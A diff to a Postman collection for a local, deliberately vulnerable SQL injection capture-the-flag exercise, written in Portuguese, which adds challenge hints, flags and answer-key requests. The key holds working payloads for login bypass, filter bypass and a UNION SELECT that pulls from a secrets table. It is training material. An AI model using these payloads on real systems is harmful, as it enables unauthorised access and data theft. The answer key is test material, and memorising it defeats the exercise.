@@ -478,32 +478,111 @@
       ]
     },
     {
-      "name": "🚩 CTF - SQL Injection",
-      "description": "⚠️ ROTAS VULNERÁVEIS - Use para aprender sobre SQL Injection",
+      "name": "🚩 CTF - SQL Injection Desafios",
+      "description": "⚠️ CAPTURE THE FLAG!\n\n🎯 Encontre as 10 flags escondidas usando SQL Injection!\n\n📝 Complete os payloads abaixo para explorar as vulnerabilidades.\n\n🌐 Interface Web: http://localhost:3000/ctf",
       "item": [
         {
-          "name": "Ver Desafios CTF",
+          "name": "📋 Ver Lista de Desafios",
           "request": {
             "method": "GET",
             "url": "{{base_url}}/api/vulnerable/flags"
-          }
+          },
+          "description": "Lista todos os desafios disponíveis com dicas e pontuação."
         },
         {
-          "name": "Busca Normal",
+          "name": "🎯 Desafio 1: Usuários Inativos (25 pts)",
           "request": {
             "method": "GET",
             "url": {
-              "raw": "{{base_url}}/api/vulnerable/search?q=café",
+              "raw": "{{base_url}}/api/vulnerable/users?role={{PREENCHA_PAYLOAD}}",
               "host": ["{{base_url}}"],
-              "path": ["api", "vulnerable", "search"],
+              "path": ["api", "vulnerable", "users"],
               "query": [
-                { "key": "q", "value": "café" }
+                { "key": "role", "value": "{{PREENCHA_PAYLOAD}}", "description": "💡 Por padrão só mostra ativos. Como ver inativos?" }
               ]
             }
-          }
+          },
+          "description": "🎯 OBJETIVO: Ver usuários INATIVOS\n\n📝 CONTEXTO:\n- A API só mostra usuários ativos por padrão\n- O usuário 'suporte_tech' está inativo e tem uma senha especial\n- Você precisa bypassar o filtro active=TRUE\n\n💡 DICA: O parâmetro role é concatenado direto na query SQL. Tente fechar a aspas e adicionar uma condição OR.\n\n🏆 FLAG: Flag{SQL_1nj3ct10n_M4st3r} (na senha do suporte_tech)"
         },
         {
-          "name": "Busca - Teste de Vulnerabilidade",
+          "name": "🎯 Desafio 2: Login Bypass (100 pts)",
+          "request": {
+            "method": "POST",
+            "url": "{{base_url}}/api/vulnerable/login",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"username\": \"{{PREENCHA_USERNAME}}\",\n    \"password\": \"{{PREENCHA_PASSWORD}}\"\n}"
+            }
+          },
+          "description": "🎯 OBJETIVO: Fazer login como ADMIN sem saber a senha!\n\n📝 CONTEXTO:\n- A query de login é: SELECT * FROM users WHERE username='X' AND password='Y'\n- Você precisa bypassar a verificação de senha\n\n💡 DICA: Use comentário SQL (--) para ignorar a parte da senha.\n\n🏆 FLAG: Flag{4dm1n_P4ssw0rd_L34k3d}"
+        },
+        {
+          "name": "🎯 Desafio 3: Código Promocional (30 pts)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/vulnerable/promo?code={{PREENCHA_PAYLOAD}}",
+              "host": ["{{base_url}}"],
+              "path": ["api", "vulnerable", "promo"],
+              "query": [
+                { "key": "code", "value": "{{PREENCHA_PAYLOAD}}", "description": "💡 Existe um código secreto com 99% de desconto!" }
+              ]
+            }
+          },
+          "description": "🎯 OBJETIVO: Encontrar o código promocional secreto com 99% de desconto\n\n📝 CONTEXTO:\n- Códigos válidos: VIP10, BEMVINDO20, CORP10\n- Existe um código FLAG99 escondido\n\n💡 DICA: Liste TODAS as promoções da tabela.\n\n🏆 FLAG: Flag{Pr0m0_C0d3_Hunt3r}"
+        },
+        {
+          "name": "🎯 Desafio 4: UNION SELECT (50 pts)",
+          "request": {
+            "method": "GET",
+            "url": "{{base_url}}/api/vulnerable/product/{{PREENCHA_PAYLOAD}}",
+            "description": "URL completa: /api/vulnerable/product/PAYLOAD"
+          },
+          "description": "🎯 OBJETIVO: Extrair dados da tabela secret_flags usando UNION SELECT\n\n📝 CONTEXTO:\n- A query SELECT tem 15 colunas\n- Você pode usar UNION para combinar com outra tabela\n- Formato: ID_INVALIDO UNION SELECT col1,col2,...\n\n💡 DICA: Comece com '0 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15 FROM secret_flags'\n\n🏆 FLAG: Flag{Un10n_S3l3ct_Pr0}"
+        },
+        {
+          "name": "🎯 Desafio 5: Notas Admin (80 pts)",
+          "request": {
+            "method": "GET",
+            "url": {
+              "raw": "{{base_url}}/api/vulnerable/notes?priority={{PREENCHA_PAYLOAD}}",
+              "host": ["{{base_url}}"],
+              "path": ["api", "vulnerable", "notes"],
+              "query": [
+                { "key": "priority", "value": "{{PREENCHA_PAYLOAD}}", "description": "💡 Há notas com prioridade 'critical' que têm segredos!" }
+              ]
+            }
+          },
+          "description": "🎯 OBJETIVO: Acessar notas confidenciais do admin\n\n📝 CONTEXTO:\n- Prioridades válidas: low, medium, high, critical\n- Uma nota 'critical' contém uma flag\n\n💡 DICA: Liste TODAS as notas da tabela.\n\n🏆 FLAG: Flag{4dm1n_N0t3s_F0und}"
+        },
+        {
+          "name": "🎯 Desafio 6: Schema Explorer (60 pts)",
+          "request": {
+            "method": "GET",
+            "url": "{{base_url}}/api/vulnerable/tables"
+          },
+          "description": "🎯 OBJETIVO: Descobrir todas as tabelas do banco de dados\n\n📝 CONTEXTO:\n- Use information_schema para mapear o banco\n- Procure por tabelas interessantes como 'secret_flags' e 'admin_notes'\n\n🏆 FLAG: Flag{1nf0rm4t10n_Sch3m4}"
+        },
+        {
+          "name": "🎯 Desafio 7: Honeypot (50 pts)",
+          "request": {
+            "method": "POST",
+            "url": "{{base_url}}/api/vulnerable/login",
+            "header": [
+              { "key": "Content-Type", "value": "application/json" }
+            ],
+            "body": {
+              "mode": "raw",
+              "raw": "{\n    \"username\": \"{{PREENCHA_USER_ARMADILHA}}\",\n    \"password\": \"qualquer\"\n}"
+            }
+          },
+          "description": "🎯 OBJETIVO: Encontrar o usuário 'honeypot' (armadilha)\n\n📝 CONTEXTO:\n- Existe um usuário falso usado como armadilha para hackers\n- O nome é comum em ataques reais\n\n💡 DICA: Qual usuário todo hacker tenta primeiro?\n\n🏆 FLAG: Flag{H0n3yp0t_D3t3ct3d}"
+        },
+        {
+          "name": "🔧 Teste: Aspas Simples",
           "request": {
             "method": "GET",
             "url": {
@@ -514,38 +593,26 @@
                 { "key": "q", "value": "'" }
               ]
             }
-          }
+          },
+          "description": "🔧 Use para testar se há vulnerabilidade SQL Injection. Se der erro de sintaxe SQL, é vulnerável!"
         },
         {
-          "name": "Busca - OR Injection",
+          "name": "✅ GABARITO - Usuários Inativos",
           "request": {
             "method": "GET",
             "url": {
-              "raw": "{{base_url}}/api/vulnerable/search?q=' OR '1'='1",
+              "raw": "{{base_url}}/api/vulnerable/users?role=' OR active=0 --",
               "host": ["{{base_url}}"],
-              "path": ["api", "vulnerable", "search"],
+              "path": ["api", "vulnerable", "users"],
               "query": [
-                { "key": "q", "value": "' OR '1'='1" }
+                { "key": "role", "value": "' OR active=0 --" }
               ]
             }
-          }
+          },
+          "description": "✅ Payload que mostra usuários inativos"
         },
         {
-          "name": "Login Vulnerável - Normal",
-          "request": {
-            "method": "POST",
-            "url": "{{base_url}}/api/vulnerable/login",
-            "header": [
-              { "key": "Content-Type", "value": "application/json" }
-            ],
-            "body": {
-              "mode": "raw",
-              "raw": "{\n    \"username\": \"admin\",\n    \"password\": \"senha_errada\"\n}"
-            }
-          }
-        },
-        {
-          "name": "Login Vulnerável - Bypass",
+          "name": "✅ GABARITO - Login Bypass",
           "request": {
             "method": "POST",
             "url": "{{base_url}}/api/vulnerable/login",
@@ -556,42 +623,38 @@
               "mode": "raw",
               "raw": "{\n    \"username\": \"admin' --\",\n    \"password\": \"qualquer\"\n}"
             }
-          }
+          },
+          "description": "✅ Payload que bypassa o login"
         },
         {
-          "name": "Produto Vulnerável - Normal",
-          "request": {
-            "method": "GET",
-            "url": "{{base_url}}/api/vulnerable/product/1"
-          }
-        },
-        {
-          "name": "Usuários Vulnerável - Ver Todos",
+          "name": "✅ GABARITO - Todas Promoções",
           "request": {
             "method": "GET",
             "url": {
-              "raw": "{{base_url}}/api/vulnerable/users?role=' OR '1'='1",
+              "raw": "{{base_url}}/api/vulnerable/promo?code=' OR '1'='1",
               "host": ["{{base_url}}"],
-              "path": ["api", "vulnerable", "users"],
+              "path": ["api", "vulnerable", "promo"],
               "query": [
-                { "key": "role", "value": "' OR '1'='1" }
+                { "key": "code", "value": "' OR '1'='1" }
               ]
             }
-          }
+          },
+          "description": "✅ Payload que lista todas as promoções"
         },
         {
-          "name": "Order By Vulnerável",
+          "name": "✅ GABARITO - Todas Notas",
           "request": {
             "method": "GET",
             "url": {
-              "raw": "{{base_url}}/api/vulnerable/order?sort=price",
+              "raw": "{{base_url}}/api/vulnerable/notes?priority=' OR '1'='1",
               "host": ["{{base_url}}"],
-              "path": ["api", "vulnerable", "order"],
+              "path": ["api", "vulnerable", "notes"],
               "query": [
-                { "key": "sort", "value": "price" }
+                { "key": "priority", "value": "' OR '1'='1" }
               ]
             }
-          }
+          },
+          "description": "✅ Payload que lista todas as notas"
         }
       ]
     },
